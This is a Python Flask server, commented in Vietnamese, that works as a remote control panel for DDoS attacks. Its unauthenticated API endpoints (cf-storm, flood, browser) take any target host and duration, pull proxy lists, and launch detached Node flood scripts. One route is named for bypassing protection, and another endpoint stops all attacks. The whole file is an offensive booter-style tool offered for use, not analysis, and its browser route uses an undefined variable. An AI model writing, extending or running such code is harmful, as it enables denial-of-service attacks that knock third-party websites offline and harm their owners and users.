from flask import Flask, request, jsonify
import subprocess
import os

app = Flask(__name__)

# Cập nhật từ điển PROXY_MAP để thêm loại proxy 'live'
PROXY_MAP = {
    "vn": ("y", "vn.txt"),
    "all": ("n", "prx.txt"),
    "live": ("v", "live.txt")  # Thêm proxy 'live' ở đây
}

def get_proxy_file(proxy_key):
    if proxy_key not in PROXY_MAP:
        return None, None
    prx_flag, proxy_file = PROXY_MAP[proxy_key]
    return prx_flag, proxy_file

def run_prx_script(prx_flag):
    try:
        subprocess.run(["python3", "prx.py", prx_flag], capture_output=True, text=True)
        return True, ""
    except Exception as e:
        return False, str(e)

def start_background_node(cmd):
    try:
        subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            start_new_session=True
        )
        return True, ""
    except Exception as e:
        return False, str(e)

@app.route('/api', methods=['GET'])
@app.route('/api/cf-storm', methods=['GET'])
def run_cf_storm():
    host = request.args.get('host')
    time_param = request.args.get('time')
    proxy_key = request.args.get('proxy', 'vn').lower()

    if not host or not time_param:
        return jsonify({"error": "Missing 'host' or 'time'"}), 400

    prx_flag, proxy_file = get_proxy_file(proxy_key)
    if not proxy_file:
        return jsonify({"error": "Invalid proxy, must be 'vn', 'all' or 'live'"}), 400

    ok, err = run_prx_script(prx_flag)
    if not ok:
        return jsonify({"error": f"Error running prx.py: {err}"}), 500

    if not os.path.exists(proxy_file):
        return jsonify({"error": f"Proxy file not found: {proxy_file}"}), 500

    cmd = ["node", "c", "GET", host, time_param, "20", "8", proxy_file]
    ok, err = start_background_node(cmd)
    if not ok:
        return jsonify({"error": f"Error running node: {err}"}), 500

    return jsonify({"status": "cf-storm started", "host": host, "proxy": proxy_file})

@app.route('/api/flood', methods=['GET'])
def run_flood():
    host = request.args.get('host')
    time_param = request.args.get('time')
    proxy_key = request.args.get('proxy', 'vn').lower()

    if not host or not time_param:
        return jsonify({"error": "Missing 'host' or 'time'"}), 400

    prx_flag, proxy_file = get_proxy_file(proxy_key)
    if not proxy_file:
        return jsonify({"error": "Invalid proxy, must be 'vn', 'all' or 'live'"}), 400

    ok, err = run_prx_script(prx_flag)
    if not ok:
        return jsonify({"error": f"Error running prx.py: {err}"}), 500

    if not os.path.exists(proxy_file):
        return jsonify({"error": f"Proxy file not found: {proxy_file}"}), 500

    cmd = ["node", "flood.txt", host, time_param, "90", "25", proxy_file, "bypass"]
    ok, err = start_background_node(cmd)
    if not ok:
        return jsonify({"error": f"Error running flood.txt: {err}"}), 500

    return jsonify({"status": "flood started", "host": host, "proxy": proxy_file})

@app.route('/api/browser', methods=['GET'])
def run_browser():
    host = request.args.get('host')
    proxy_key = request.args.get('proxy', 'vn').lower()

    if not host:
        return jsonify({"error": "Missing 'host'"}), 400

    prx_flag, proxy_file = get_proxy_file(proxy_key)
    if not proxy_file:
        return jsonify({"error": "Invalid proxy, must be 'vn', 'all' or 'live'"}), 400

    ok, err = run_prx_script(prx_flag)
    if not ok:
        return jsonify({"error": f"Error running prx.py: {err}"}), 500

    if not os.path.exists(proxy_file):
        return jsonify({"error": f"Proxy file not found: {proxy_file}"}), 500

    cmd = ["node", "browser.js", host, "8", proxy_file, "32", time_param]
    ok, err = start_background_node(cmd)
    if not ok:
        return jsonify({"error": f"Error running browser.js: {err}"}), 500

    return jsonify({"status": "browser attack started", "host": host, "proxy": proxy_file})

@app.route('/api/stop', methods=['GET'])
def stop_all_nodes():
    try:
        subprocess.run(["pkill", "-f", "node"], check=True)
        return jsonify({"status": "All node scripts stopped"})
    except subprocess.CalledProcessError:
        return jsonify({"status": "No node process found or already stopped"})
    except Exception as e:
        return jsonify({"error": f"Error stopping processes: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1110)
